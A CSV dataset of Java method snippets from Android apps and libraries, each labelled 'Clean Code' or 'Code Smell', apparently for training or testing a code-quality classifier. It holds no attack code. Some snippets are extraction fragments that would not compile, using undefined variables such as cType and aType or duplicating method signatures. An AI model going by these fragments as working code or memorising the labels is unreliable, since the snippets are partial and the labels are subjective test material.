text,label,text_label
"private static FakeExtractorOutput consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  FakeExtractorOutput output=new FakeExtractorOutput();
  extractor.init(output);
  consumeTestData(extractor,input,timeUs,output,retryFromStartIfLive);
  return output;
}
private static void consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,FakeExtractorOutput output,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  extractor.seek(input.getPosition(),timeUs);
  PositionHolder seekPositionHolder=new PositionHolder();
  int readResult=Extractor.RESULT_CONTINUE;
  while (readResult != Extractor.RESULT_END_OF_INPUT) {
    try {
      seekPositionHolder.position=Long.MIN_VALUE;
      readResult=extractor.read(input,seekPositionHolder);
      if (readResult == Extractor.RESULT_SEEK) {
        long seekPosition=seekPositionHolder.position;
        Assertions.checkState(0 <= seekPosition && seekPosition <= Integer.MAX_VALUE);
        input.setPosition((int)seekPosition);
      }
    }
 catch (    SimulatedIOException e) {
      if (!retryFromStartIfLive) {
        continue;
      }
      boolean isOnDemand=input.getLength() != C.LENGTH_UNSET || (output.seekMap != null && output.seekMap.getDurationUs() != C.TIME_UNSET);
      if (isOnDemand) {
        continue;
      }
      input.setPosition(0);
      for (int i=0; i < output.numberOfTracks; i++) {
        output.trackOutputs.valueAt(i).clear();
      }
      extractor.seek(0,0);
    }
  }
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void deleteStockCheck(List<Long> ids){
  List<ErpStockCheckDO> stockChecks=stockCheckMapper.selectBatchIds(ids);
  if (CollUtil.isEmpty(stockChecks)) {
    return;
  }
  stockChecks.forEach(stockCheck -> {
    if (ErpAuditStatus.APPROVE.getStatus().equals(stockCheck.getStatus())) {
      throw exception(STOCK_CHECK_DELETE_FAIL_APPROVE,stockCheck.getNo());
    }
  }
);
  stockChecks.forEach(stockCheck -> {
    stockCheckMapper.deleteById(stockCheck.getId());
    stockCheckItemMapper.deleteByCheckId(stockCheck.getId());
  }
);
}
",0,Clean Code
"public void openSearchWithText(String text){
  boolean delay=false;
  if (savedMessagesHint != null && savedMessagesHint.shown()) {
    savedMessagesHint.hide();
    delay=true;
  }
  if (savedMessagesSearchHint != null && savedMessagesSearchHint.shown()) {
    savedMessagesSearchHint.hide();
    delay=true;
  }
  if (delay) {
    AndroidUtilities.runOnUIThread(() -> openSearchWithText(text),200);
    return;
  }
  if (!actionBar.isSearchFieldVisible()) {
    AndroidUtilities.updateViewVisibilityAnimated(avatarContainer,false,0.95f,true);
    if (headerItem != null) {
      headerItem.setVisibility(View.GONE);
    }
    if (attachItem != null) {
      attachItem.setVisibility(View.GONE);
    }
    if (editTextItem != null) {
      editTextItem.setVisibility(View.GONE);
    }
    if ((threadMessageId == 0 || chatMode == MODE_SAVED) && searchItem != null) {
      searchItem.setVisibility(View.VISIBLE);
    }
    if (searchIconItem != null && showSearchAsIcon) {
      searchIconItem.setVisibility(View.GONE);
    }
    if (audioCallIconItem != null && showAudioCallAsIcon) {
      audioCallIconItem.setVisibility(View.GONE);
    }
    searchItemVisible=true;
    if (viewInChatItem != null)     viewInChatItem.setVisibility(View.GONE);
    updateSearchButtons(0,0,-1);
    updateBottomOverlay();
  }
  if ((threadMessageId == 0 || isTopic || chatMode == MODE_SAVED) && !UserObject.isReplyUser(currentUser)) {
    openSearchKeyboard=text == null;
    if (searchItem != null) {
      searchItem.openSearch(openSearchKeyboard);
    }
  }
  if (searchItem != null) {
    searchItem.setSearchFieldText(text,false);
  }
  getMediaDataController().searchMessagesInChat(searchingQuery=(text == null ? """" : text),dialog_id,mergeDialogId,classGuid,0,threadMessageId,false,searchingUserMessages,searchingChatMessages,!TextUtils.isEmpty(text),searchingReaction,searchingType=null);
  updatePinnedMessageView(true);
}",1,Code Smell
"private void performWriteContactsToPhoneBookInternal(ArrayList<TLRPC.TL_contact> contactsArray){
  Cursor cursor=null;
  try {
    Account account=systemAccount;
    if (!hasContactsPermission() || account == null) {
      return;
    }
    final SharedPreferences settings=MessagesController.getMainSettings(currentAccount);
    final boolean forceUpdate=!settings.getBoolean(""contacts_updated_v7"",false);
    if (forceUpdate) {
      settings.edit().putBoolean(""contacts_updated_v7"",true).commit();
    }
    final ContentResolver contentResolver=ApplicationLoader.applicationContext.getContentResolver();
    Uri rawContactUri=ContactsContract.RawContacts.CONTENT_URI.buildUpon().appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_NAME,systemAccount.name).appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_TYPE,systemAccount.type).build();
    cursor=contentResolver.query(rawContactUri,new String[]{BaseColumns._ID,ContactsContract.RawContacts.SYNC2},null,null,null);
    LongSparseArray<Long> bookContacts=new LongSparseArray<>();
    if (cursor != null) {
      while (cursor.moveToNext()) {
        bookContacts.put(cursor.getLong(1),cursor.getLong(0));
      }
      cursor.close();
      cursor=null;
      for (int a=0; a < contactsArray.size(); a++) {
        TLRPC.TL_contact u=contactsArray.get(a);
        if (forceUpdate || bookContacts.indexOfKey(u.user_id) < 0) {
          addContactToPhoneBook(getMessagesController().getUser(u.user_id),forceUpdate);
        }
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
 finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}",1,Code Smell
"@Override public void onProcessMessage(V2TIMMessage v2TIMMessage){
  String data=new String(v2TIMMessage.getCustomElem().getData());
  if (!TextUtils.isEmpty(data)) {
    invisibleBean=new InvisibleBean();
    try {
      JSONObject invisibleJson=new JSONObject(data);
      invisibleBean.src=invisibleJson.optString(TUIConstants.TUICustomerServicePlugin.CUSTOMER_SERVICE_BUSINESS_ID_SRC_KEY);
      JSONObject contentJson=invisibleJson.optJSONObject(TUICustomerServiceConstants.CUSTOMER_SERVICE_ITEM_CONTENT);
      if (contentJson != null) {
        invisibleBean.menuSendRuleFlag=contentJson.optInt(InvisibleBean.MENU_SEND_RULE_FLAG);
      }
    }
 catch (    JSONException e) {
      TUIChatLog.e(""InvisibleMessageBean"",""exception e = "" + e);
    }
  }
  if (invisibleBean != null) {
    if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SELECTED)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.satisfaction_evaluation));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_END)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_end));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TIMEOUT)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_timeout));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SETTING)) {
      int triggerResult=invisibleBean.menuSendRuleFlag & invisibleBean.RULE_USER_TRIGGER_EVALUATION;
      TUICustomerServicePluginService.getInstance().setCanTriggerEvaluation(triggerResult > 0 ? true : false);
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TRIGGER_EVALUATION)) {
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_SAY_HELLO)) {
    }
 else {
      String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
      setExtra(text);
    }
  }
 else {
    String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
    setExtra(text);
  }
}",0,Clean Code
"public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children){
  setupWithBottomNavigationView(bottomNavigationView,groupScene,containerId,children,null);
}
public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children,@Nullable final BottomNavigationView.OnNavigationItemSelectedListener onNavigationItemSelectedListener){
  if (children.size() == 0) {
    throw new IllegalArgumentException(""children can't be empty"");
  }
  final List<String> menuIdList=new ArrayList<>();
  int menuSize=bottomNavigationView.getMenu().size();
  for (int i=0; i < menuSize; i++) {
    menuIdList.add(String.valueOf(bottomNavigationView.getMenu().getItem(i).getItemId()));
  }
  bottomNavigationView.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener(){
    @Override public boolean onNavigationItemSelected(    @NonNull MenuItem item){
      if (onNavigationItemSelectedListener != null) {
        onNavigationItemSelectedListener.onNavigationItemSelected(item);
      }
      item.setChecked(true);
      String tag=String.valueOf(item.getItemId());
      Scene scene=groupScene.findSceneByTag(tag);
      if (scene == null) {
        scene=children.get(item.getItemId());
      }
      if (!groupScene.isAdded(scene)) {
        groupScene.add(containerId,scene,tag);
      }
 else       if (!groupScene.isShowing(scene)) {
        groupScene.show(scene);
      }
      for (int i=0; i < menuIdList.size(); i++) {
        Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
        if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
          groupScene.hide(otherScene);
        }
      }
      return true;
    }
  }
);
  Map.Entry<Integer,Scene> firstItem=children.entrySet().iterator().next();
  String tag=String.valueOf(firstItem.getKey());
  Scene scene=groupScene.findSceneByTag(tag);
  if (scene == null) {
    scene=firstItem.getValue();
  }
  if (!groupScene.isAdded(scene)) {
    groupScene.add(containerId,scene,tag);
  }
 else   if (!groupScene.isShowing(scene)) {
    groupScene.show(scene);
  }
  for (int i=0; i < menuIdList.size(); i++) {
    Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
    if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
      groupScene.hide(otherScene);
    }
  }
  bottomNavigationView.getMenu().findItem(firstItem.getKey()).setChecked(true);
}",1,Code Smell
"public static void handleReadDocument(Activity activity,@Nullable Uri data) throws IOException, JSONException {
  if (data == null)   return;
  SharedPreferences.Editor edit=PrefsUtils.mSharedPreferences.edit();
  InputStream inputStream=activity.getContentResolver().openInputStream(data);
  BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream));
  StringBuilder stringBuilder=new StringBuilder();
  String line=bufferedReader.readLine();
  while (line != null) {
    stringBuilder.append(line);
    line=bufferedReader.readLine();
  }
  String read=stringBuilder.toString();
  JSONObject jsonObject=new JSONObject(read);
  Iterator<String> keys=jsonObject.keys();
  while (keys.hasNext()) {
    String key=keys.next();
    Object value=jsonObject.get(key);
    if (value instanceof String) {
      if (((String)value).contains(""["") && ((String)value).contains(""]"")) {
        value=((String)value).replace(""["","""").replace(""]"","""").replace("" "","""");
        String[] array=((String)value).split("","");
        List<String> list=Arrays.asList(array);
        Set<String> stringSet=new HashSet<>(list);
        edit.putStringSet(key,stringSet);
      }
 else {
        edit.putString(key,(String)value);
      }
    }
 else     if (value instanceof Boolean) {
      edit.putBoolean(key,(Boolean)value);
    }
 else     if (value instanceof Integer) {
      edit.putInt(key,(Integer)value);
    }
  }
  bufferedReader.close();
  edit.apply();
}
",1,Code Smell
"@SuppressWarnings(""unchecked"") private static boolean isSynthesizable(Class<? extends Annotation> annotationType){
  if (hasPlainJavaAnnotationsOnly(annotationType)) {
    return false;
  }
  Boolean synthesizable=synthesizableCache.get(annotationType);
  if (synthesizable != null) {
    return synthesizable;
  }
  synthesizable=Boolean.FALSE;
  for (  Method attribute : getAttributeMethods(annotationType)) {
    if (!getAttributeAliasNames(attribute).isEmpty()) {
      synthesizable=Boolean.TRUE;
      break;
    }
    Class<?> returnType=attribute.getReturnType();
    if (Annotation[].class.isAssignableFrom(returnType)) {
      Class<? extends Annotation> nestedAnnotationType=(Class<? extends Annotation>)returnType.getComponentType();
      if (isSynthesizable(nestedAnnotationType)) {
        synthesizable=Boolean.TRUE;
        break;
      }
    }
 else     if (Annotation.class.isAssignableFrom(returnType)) {
      Class<? extends Annotation> nestedAnnotationType=(Class<? extends Annotation>)returnType;
      if (isSynthesizable(nestedAnnotationType)) {
        synthesizable=Boolean.TRUE;
        break;
      }
    }
  }
  synthesizableCache.put(annotationType,synthesizable);
  return synthesizable;
}
",0,Clean Code
"private void openAddMember(){
  Bundle args=new Bundle();
  args.putBoolean(""addToGroup"",true);
  args.putLong(""chatId"",currentChat.id);
  GroupCreateActivity fragment=new GroupCreateActivity(args);
  fragment.setInfo(chatInfo);
  if (chatInfo != null && chatInfo.participants != null) {
    LongSparseArray<TLObject> users=new LongSparseArray<>();
    for (int a=0; a < chatInfo.participants.participants.size(); a++) {
      users.put(chatInfo.participants.participants.get(a).user_id,null);
    }
    fragment.setIgnoreUsers(users);
  }
  fragment.setDelegate((users,fwdCount) -> {
    HashSet<Long> currentParticipants=new HashSet<>();
    ArrayList<TLRPC.User> addedUsers=new ArrayList<>();
    if (chatInfo.participants.participants != null) {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        currentParticipants.add(chatInfo.participants.participants.get(i).user_id);
      }
    }
    getMessagesController().addUsersToChat(currentChat,ProfileActivity.this,users,fwdCount,user -> {
      addedUsers.add(user);
    }
,restrictedUser -> {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        if (chatInfo.participants.participants.get(i).user_id == restrictedUser.id) {
          chatInfo.participants.participants.remove(i);
          updateListAnimated(true);
          break;
        }
      }
    }
,() -> {
      int N=addedUsers.size();
      int[] finished=new int[1];
      for (int a=0; a < N; a++) {
        TLRPC.User user=addedUsers.get(a);
        if (!currentParticipants.contains(user.id)) {
          if (chatInfo.participants == null) {
            chatInfo.participants=new TLRPC.TL_chatParticipants();
          }
          if (ChatObject.isChannel(currentChat)) {
            TLRPC.TL_chatChannelParticipant channelParticipant1=new TLRPC.TL_chatChannelParticipant();
            channelParticipant1.channelParticipant=new TLRPC.TL_channelParticipant();
            channelParticipant1.channelParticipant.inviter_id=getUserConfig().getClientUserId();
            channelParticipant1.channelParticipant.peer=new TLRPC.TL_peerUser();
            channelParticipant1.channelParticipant.peer.user_id=user.id;
            channelParticipant1.channelParticipant.date=getConnectionsManager().getCurrentTime();
            channelParticipant1.user_id=user.id;
            chatInfo.participants.participants.add(channelParticipant1);
          }
 else {
            TLRPC.ChatParticipant participant=new TLRPC.TL_chatParticipant();
            participant.user_id=user.id;
            participant.inviter_id=getAccountInstance().getUserConfig().clientUserId;
            chatInfo.participants.participants.add(participant);
          }
          chatInfo.participants_count++;
          getMessagesController().putUser(user,false);
        }
      }
      updateListAnimated(true);
    }
);
  }
);
  presentFragment(fragment);
}",1,Code Smell
"public int getMenuLeft(View content,int page){
  if (mMode == SlidingMenu.LEFT) {
switch (page) {
case 0:
      return content.getLeft() - getBehindWidth();
case 2:
    return content.getLeft();
}
}
 else if (mMode == SlidingMenu.RIGHT) {
switch (page) {
case 0:
  return content.getLeft();
case 2:
return content.getLeft() + getBehindWidth();
}
}
 else if (mMode == SlidingMenu.LEFT_RIGHT) {
switch (page) {
case 0:
return content.getLeft() - getBehindWidth();
case 2:
return content.getLeft() + getBehindWidth();
}
}
return content.getLeft();
}",0,Clean Code
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  JavaIsoVisitor<ExecutionContext> condition=new JavaIsoVisitor<ExecutionContext>(){
    @Override public @Nullable J preVisit(    J tree,    ExecutionContext ctx){
      if (tree instanceof JavaSourceFile) {
        JavaSourceFile cu=(JavaSourceFile)requireNonNull(tree);
        if (cu.getPackageDeclaration() != null) {
          String original=cu.getPackageDeclaration().getExpression().printTrimmed(getCursor()).replaceAll(""\\s"","""");
          if (original.startsWith(oldPackageName)) {
            return SearchResult.found(cu);
          }
        }
        boolean recursive=Boolean.TRUE.equals(ChangePackage.this.recursive);
        String recursivePackageNamePrefix=oldPackageName + ""."";
        for (        J.Import anImport : cu.getImports()) {
          String importedPackage=anImport.getPackageName();
          if (importedPackage.equals(oldPackageName) || recursive && importedPackage.startsWith(recursivePackageNamePrefix)) {
            return SearchResult.found(cu);
          }
        }
        for (        JavaType type : cu.getTypesInUse().getTypesInUse()) {
          if (type instanceof JavaType.FullyQualified) {
            String packageName=((JavaType.FullyQualified)type).getPackageName();
            if (packageName.equals(oldPackageName) || recursive && packageName.startsWith(recursivePackageNamePrefix)) {
              return SearchResult.found(cu);
            }
          }
        }
        stopAfterPreVisit();
      }
      return super.preVisit(tree,ctx);
    }
  }
;
  return Preconditions.check(condition,new ChangePackageVisitor());
}
",1,Code Smell
"/** 
 * Check whether this exception contains an exception of the given type: either it is of the given class itself or it contains a nested cause of the given type.
 * @param exType the exception type to look for
 * @return whether there is a nested exception of the specified type
 */
public boolean contains(Class exType){
  if (exType == null) {
    return false;
  }
  if (exType.isInstance(this)) {
    return true;
  }
  Throwable cause=getCause();
  if (cause == this) {
    return false;
  }
  if (cause instanceof NestedRuntimeException) {
    return ((NestedRuntimeException)cause).contains(exType);
  }
 else {
    while (cause != null) {
      if (exType.isInstance(cause)) {
        return true;
      }
      if (cause.getCause() == cause) {
        break;
      }
      cause=cause.getCause();
    }
    return false;
  }
}
",1,Code Smell
"@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onUrlClick(url);
  }
 else {
    super.onClick(widget);
  }
}
@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onTimeClick(url);
  }
}
",0,Clean Code
"private void generateObjs(JMethod method,HeapModel heapModel,int k){
  Deque<Pair<Obj,Integer>> queue=new ArrayDeque<>();
  if (!method.isStatic() && !method.getDeclaringClass().isAbstract()) {
    thisObj=heapModel.getMockObj(Descriptor.ENTRY_DESC,new MethodParam(method,THIS_INDEX),method.getDeclaringClass().getType(),method);
    queue.add(new Pair<>(thisObj,0));
  }
  paramObjs=new Obj[method.getParamCount()];
  for (int i=0; i < method.getParamCount(); ++i) {
    Type paramType=method.getParamType(i);
    if (isInstantiable(paramType)) {
      paramObjs[i]=heapModel.getMockObj(Descriptor.ENTRY_DESC,new MethodParam(method,i),paramType,method);
      queue.add(new Pair<>(paramObjs[i],0));
    }
  }
  fieldObjs=Maps.newTwoKeyMultiMap();
  arrayObjs=Maps.newMultiMap();
  while (!queue.isEmpty()) {
    Pair<Obj,Integer> pair=queue.pop();
    Obj base=pair.first();
    int level=pair.second();
    if (level < k) {
      Type type=base.getType();
      if (type instanceof ClassType) {
        for (        JField field : cType.getJClass().getDeclaredFields()) {
          Type fieldType=field.getType();
          if (isInstantiable(fieldType)) {
            Obj obj=heapModel.getMockObj(Descriptor.ENTRY_DESC,base.getAllocation() + ""."" + field.getName(),fieldType,method);
            fieldObjs.put(base,field,obj);
            queue.add(new Pair<>(obj,level + 1));
          }
        }
      }
 else       if (type instanceof ArrayType) {
        Type elemType=aType.elementType();
        if (isInstantiable(elemType)) {
          Obj elem=heapModel.getMockObj(Descriptor.ENTRY_DESC,base.getAllocation() + ""[*]"",elemType,method);
          arrayObjs.put(base,elem);
          queue.add(new Pair<>(elem,level + 1));
        }
      }
    }
  }
}",1,Code Smell
"private void createPanel(final boolean indeterminate,final boolean showSeconds,final boolean showCancelButton,final boolean addBorder){
  setLayout(new BorderLayout());
  final JPanel pPb=new JPanel(new BorderLayout());
  pPb.setBorder(new TitledBorder(""""));
  if (m_description == null) {
    m_label.setVisible(false);
  }
 else {
    m_label.setText(convertTextToHtml(m_description));
  }
  pPb.add(m_label,BorderLayout.NORTH);
  m_progressBar.setIndeterminate(indeterminate);
  m_progressBar.setStringPainted(true);
  final JPanel borderPanel=new JPanel(new BorderLayout());
  if (addBorder) {
    borderPanel.setBorder(BorderFactory.createCompoundBorder(new LineBorder(Color.GRAY),new EmptyBorder(1,1,1,1)));
  }
  if (showCancelButton) {
    final JPanel buttonPanel=new JPanel(new BorderLayout());
    final JButton cancelButton=new JButton(new CancelAction());
    cancelButton.setFocusable(false);
    final JPanel paddingPanel=new JPanel(new BorderLayout());
    paddingPanel.setBorder(new EmptyBorder(0,1,0,0));
    paddingPanel.setMinimumSize(new Dimension(1,0));
    buttonPanel.add(paddingPanel,BorderLayout.WEST);
    buttonPanel.add(cancelButton,BorderLayout.EAST);
    borderPanel.add(buttonPanel,BorderLayout.EAST);
  }
  borderPanel.add(m_progressBar,BorderLayout.CENTER);
  pPb.add(borderPanel,BorderLayout.CENTER);
  if (indeterminate && showSeconds) {
    updateSecondsText();
    m_timer.setRepeats(true);
  }
  add(pPb,BorderLayout.NORTH);
}",0,Clean Code
"protected boolean computeScrollHelper(){
  if (mScroller.computeScrollOffset()) {
    int oldPos=mOrientationHandler.getPrimaryScroll(this);
    int newPos=mScroller.getCurrX();
    if (oldPos != newPos) {
      mOrientationHandler.setPrimary(this,VIEW_SCROLL_TO,mScroller.getCurrX());
    }
    if (mAllowOverScroll) {
      if (newPos < mMinScroll && oldPos >= mMinScroll) {
        mEdgeGlowLeft.onAbsorb((int)mScroller.getCurrVelocity());
        abortScrollerAnimation(false);
        onEdgeAbsorbingScroll();
      }
 else       if (newPos > mMaxScroll && oldPos <= mMaxScroll) {
        mEdgeGlowRight.onAbsorb((int)mScroller.getCurrVelocity());
        abortScrollerAnimation(false);
        onEdgeAbsorbingScroll();
      }
    }
    int finalPos=mOrientationHandler.getPrimaryValue(mScroller.getFinalX(),mScroller.getFinalY());
    if (newPos == finalPos && mEdgeGlowLeft.isFinished() && mEdgeGlowRight.isFinished()) {
      abortScrollerAnimation(false);
    }
    invalidate();
    return true;
  }
 else   if (mNextPage != INVALID_PAGE) {
    sendScrollAccessibilityEvent();
    int prevPage=mCurrentPage;
    mCurrentPage=validateNewPage(mNextPage);
    mCurrentScrollOverPage=mCurrentPage;
    mNextPage=INVALID_PAGE;
    notifyPageSwitchListener(prevPage);
    if (!mIsBeingDragged) {
      pageEndTransition();
    }
    if (canAnnouncePageDescription()) {
      announcePageForAccessibility();
    }
  }
  return false;
}
",1,Code Smell
"/** 
 * @hide 
 */
@Override public CharSequence getText(int id) throws NotFoundException {
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(id);
}
/** 
 * @hide 
 */
@Override public CharSequence getText(int id,CharSequence def){
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId,def);
  }
  return super.getText(id,def);
}
@Override public CharSequence getText(int index){
  Object replacement=((XResources)getResources()).getReplacement(getResourceId(index,0));
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(index);
}",0,Clean Code
"private void onSubscribe(int buttonState){
  if (!mIsMetadataLoaded) {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    return;
  }
  if (!YouTubeSignInService.instance().isSigned()) {
    MessageHelpers.showMessage(getContext(),R.string.msg_signed_users_only);
    return;
  }
  if (buttonState == PlayerUI.BUTTON_OFF) {
    callMediaItemObservable(mMediaItemService::subscribeObserve);
  }
 else {
    callMediaItemObservable(mMediaItemService::unsubscribeObserve);
  }
  getPlayer().getVideo().isSubscribed=buttonState == PlayerUI.BUTTON_OFF;
  getPlayer().setButtonState(R.id.action_subscribe,buttonState == PlayerUI.BUTTON_OFF ? PlayerUI.BUTTON_ON : PlayerUI.BUTTON_OFF);
}
",0,Clean Code
"public static void loadCountries(Utilities.Callback<Pair<Map<String,List<TLRPC.TL_help_country>>,List<String>>> onDone){
  ConnectionsManager connection=ConnectionsManager.getInstance(UserConfig.selectedAccount);
  TLRPC.TL_help_getCountriesList req=new TLRPC.TL_help_getCountriesList();
  req.lang_code=LocaleController.getInstance().getCurrentLocaleInfo() != null ? LocaleController.getInstance().getCurrentLocaleInfo().getLangCode() : Locale.getDefault().getCountry();
  int reqId=connection.sendRequest(req,(response,error) -> {
    if (response != null) {
      TLRPC.TL_help_countriesList help_countriesList=(TLRPC.TL_help_countriesList)response;
      Map<String,List<TLRPC.TL_help_country>> countriesMap=new HashMap<>();
      List<String> sortedLetters=new ArrayList<>();
      for (int i=0; i < help_countriesList.countries.size(); i++) {
        TLRPC.TL_help_country country=help_countriesList.countries.get(i);
        if (country.name != null) {
          country.default_name=country.name;
        }
        if (country.iso2.equalsIgnoreCase(""FT"")) {
          continue;
        }
        String letter=country.default_name.substring(0,1).toUpperCase();
        List<TLRPC.TL_help_country> arr=countriesMap.get(letter);
        if (arr == null) {
          arr=new ArrayList<>();
          countriesMap.put(letter,arr);
          sortedLetters.add(letter);
        }
        arr.add(country);
      }
      Comparator<String> comparator;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
        Collator collator=Collator.getInstance(LocaleController.getInstance().getCurrentLocale() != null ? LocaleController.getInstance().getCurrentLocale() : Locale.getDefault());
        comparator=collator::compare;
      }
 else {
        comparator=String::compareTo;
      }
      Collections.sort(sortedLetters,comparator);
      for (      List<TLRPC.TL_help_country> arr : countriesMap.values()) {
        Collections.sort(arr,(country,country2) -> comparator.compare(country.default_name,country2.default_name));
      }
      AndroidUtilities.runOnUIThread(() -> onDone.run(new Pair<>(countriesMap,sortedLetters)));
    }
  }
);
}",1,Code Smell
